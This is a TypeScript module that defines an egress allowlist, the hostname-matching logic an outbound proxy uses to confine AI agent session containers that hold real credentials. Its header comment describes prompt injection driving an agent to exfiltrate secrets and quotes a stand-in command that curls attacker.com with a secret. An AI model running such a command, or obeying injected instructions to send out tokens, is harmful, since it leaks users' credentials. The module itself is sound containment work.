/**
 * Egress allowlist — the set of hostnames a session container is permitted to
 * reach through the orchestrator-controlled forward proxy (`egress-proxy.ts`).
 *
 * docs/172-agent-containment Gap 1 (SHI-90). Session containers hold real
 * credentials (the pinned agent's OAuth/subscription token, MCP tokens, the
 * brokered GitHub PAT) and, by product design, run with minimal human-in-the-
 * loop friction. The load-bearing backstop against credential exfiltration via
 * direct prompt injection is **default-deny egress with a narrow allowlist**:
 * the agent can reach the hosts it legitimately needs (its own API, the git
 * host, package registries, the user's configured MCP servers) and nothing
 * else, so `curl https://attacker.com/?d=$SECRET` has nowhere to go.
 *
 * This module owns the *allowlist*; the *enforcement* (CONNECT/HTTP proxy that
 * answers 403 for a denied host) lives in `egress-proxy.ts`. Keeping them split
 * means the matcher is a pure, exhaustively-testable function with no sockets.
 *
 * Matching rules (`hostMatches`):
 *   - An entry beginning with "." (e.g. ".github.com") is a **suffix** match:
 *     it matches that domain AND any subdomain ("github.com", "api.github.com").
 *   - Any other entry is an **exact** hostname match.
 * Host comparison is case-insensitive and ignores a single trailing dot
 * (FQDN form "github.com.").
 */

import type { CredentialStore } from "./credential-store.js";
import { getMcpOAuthProvider } from "./mcp-oauth-providers.js";

// ---------------------------------------------------------------------------
// Default base allowlist — the hosts every session legitimately needs
// ---------------------------------------------------------------------------

/**
 * The always-on base allowlist. Grouped by purpose so it's obvious why each
 * host is here and what removing it would break. Suffix entries (".x.com")
 * cover the family of subdomains a service spreads its traffic across (CDNs,
 * regional shards, telemetry) without enumerating every one.
 *
 * Operators extend this per-deployment via `SESSION_EGRESS_ALLOWLIST` (see
 * `parseAllowlistEnv`); MCP server hosts are added dynamically from the
 * credential store (see `mcpHostsFromCredentialStore`).
 */
export const EGRESS_DEFAULT_ALLOWLIST: readonly string[] = [
  // --- Agent API endpoints (Claude / Anthropic) ---
  ".anthropic.com", // api.anthropic.com (inference), console.anthropic.com (OAuth), statsig.anthropic.com
  ".claude.ai", // claude.ai OAuth / subscription endpoints
  // --- Agent API endpoints (Codex / OpenAI) ---
  ".openai.com", // api.openai.com, auth.openai.com
  ".chatgpt.com", // chatgpt.com (Codex subscription auth)

  // --- Git host ---
  // ShipIt only authenticates against GitHub today (see docs/172 Gap 2). The
  // suffix covers github.com, api.github.com, codeload.github.com.
  ".github.com",
  ".githubusercontent.com", // raw.githubusercontent.com, objects.githubusercontent.com (release/LFS assets)
  ".githubassets.com",

  // --- Package registries ---
  ".npmjs.org", // registry.npmjs.org
  ".npmjs.com",
  ".yarnpkg.com", // registry.yarnpkg.com
  ".pypi.org", // pypi.org
  ".pythonhosted.org", // files.pythonhosted.org (wheel downloads)
];

// ---------------------------------------------------------------------------
// Host matching
// ---------------------------------------------------------------------------

/** Normalize a hostname for comparison: lowercase, strip one trailing dot. */
export function normalizeHost(host: string): string {
  let h = host.trim().toLowerCase();
  if (h.endsWith(".")) h = h.slice(0, -1);
  return h;
}

/**
 * Does `host` match a single allowlist `entry`?
 *
 * - ".suffix" matches "suffix" and "*.suffix".
 * - anything else is an exact match.
 */
export function hostMatchesEntry(host: string, entry: string): boolean {
  const h = normalizeHost(host);
  const e = normalizeHost(entry);
  if (!h || !e) return false;
  if (e.startsWith(".")) {
    const bare = e.slice(1);
    return h === bare || h.endsWith(e);
  }
  return h === e;
}

/**
 * A compiled allowlist — `isAllowed(host)` is the single predicate the proxy
 * calls per connection. Construct via {@link buildEgressAllowlist}.
 */
export interface EgressAllowlist {
  /** The full, de-duplicated list of entries (for logging / diagnostics). */
  entries: string[];
  /** True iff `host` matches any entry. */
  isAllowed(host: string): boolean;
}

/** Build an {@link EgressAllowlist} from an explicit list of entries. */
export function makeAllowlist(entries: Iterable<string>): EgressAllowlist {
  // De-dupe (normalized) while preserving readable original casing in `entries`.
  const seen = new Set<string>();
  const kept: string[] = [];
  for (const raw of entries) {
    const norm = normalizeHost(raw);
    if (!norm || seen.has(norm)) continue;
    seen.add(norm);
    kept.push(norm);
  }
  return {
    entries: kept,
    isAllowed(host: string): boolean {
      if (!host) return false;
      return kept.some((e) => hostMatchesEntry(host, e));
    },
  };
}

// ---------------------------------------------------------------------------
// Sources: env extras + MCP hosts
// ---------------------------------------------------------------------------

/**
 * Parse a comma/whitespace-separated `SESSION_EGRESS_ALLOWLIST` value into a
 * list of allowlist entries. Empty/undefined → []. Entries are taken verbatim
 * (a leading "." still means suffix-match), trimmed, and blanks dropped.
 */
export function parseAllowlistEnv(value: string | undefined): string[] {
  if (!value) return [];
  return value
    .split(/[\s,]+/)
    .map((s) => s.trim())
    .filter(Boolean);
}

/** Extract the hostname from a URL string; null if unparseable or hostless. */
export function hostFromUrl(url: string): string | null {
  try {
    const h = new URL(url).hostname;
    return h ? normalizeHost(h) : null;
  } catch {
    return null;
  }
}

/**
 * Derive the set of MCP server hosts a session is allowed to reach from the
 * credential store:
 *   - the `url` host of every configured HTTP MCP server (enabled or not — a
 *     disabled server the user re-enables mid-session must still resolve), and
 *   - the `mcpUrl` host of every OAuth-connected MCP provider (e.g. Notion).
 *
 * stdio MCP servers run as local child processes and make no outbound
 * connection of their own that we can attribute, so they contribute no host.
 */
export function mcpHostsFromCredentialStore(store: CredentialStore): string[] {
  const hosts = new Set<string>();

  for (const cfg of Object.values(store.getAllMcpServers())) {
    if (cfg.type === "http") {
      const h = hostFromUrl(cfg.url);
      if (h) hosts.add(h);
    }
  }

  for (const source of Object.keys(store.getAllMcpOAuthTokens())) {
    const provider = getMcpOAuthProvider(source);
    if (provider) {
      const h = hostFromUrl(provider.mcpUrl);
      if (h) hosts.add(h);
    }
  }

  return [...hosts];
}

// ---------------------------------------------------------------------------
// Composition
// ---------------------------------------------------------------------------

export interface BuildAllowlistOpts {
  /** Override the base list (defaults to {@link EGRESS_DEFAULT_ALLOWLIST}). */
  base?: readonly string[];
  /** Operator-supplied extra hosts (e.g. from `SESSION_EGRESS_ALLOWLIST`). */
  extraHosts?: Iterable<string>;
  /**
   * Credential store to pull live MCP hosts from. When provided, the resulting
   * allowlist re-reads it on every `isAllowed` call so a server added/connected
   * mid-session is reachable without restarting the proxy.
   */
  credentialStore?: CredentialStore;
}

/**
 * Compose the effective egress allowlist from the base list, operator extras,
 * and (live) MCP hosts.
 *
 * When a `credentialStore` is supplied the predicate is **dynamic**: MCP hosts
 * are re-derived per call, so connecting a new MCP server takes effect
 * immediately. The static portion (base + extras) is compiled once.
 */
export function buildEgressAllowlist(opts: BuildAllowlistOpts = {}): EgressAllowlist {
  const base = opts.base ?? EGRESS_DEFAULT_ALLOWLIST;
  const staticPart = makeAllowlist([...base, ...(opts.extraHosts ?? [])]);
  const store = opts.credentialStore;

  if (!store) return staticPart;

  return {
    entries: staticPart.entries,
    isAllowed(host: string): boolean {
      if (staticPart.isAllowed(host)) return true;
      return mcpHostsFromCredentialStore(store).some((e) => hostMatchesEntry(host, e));
    },
  };
}
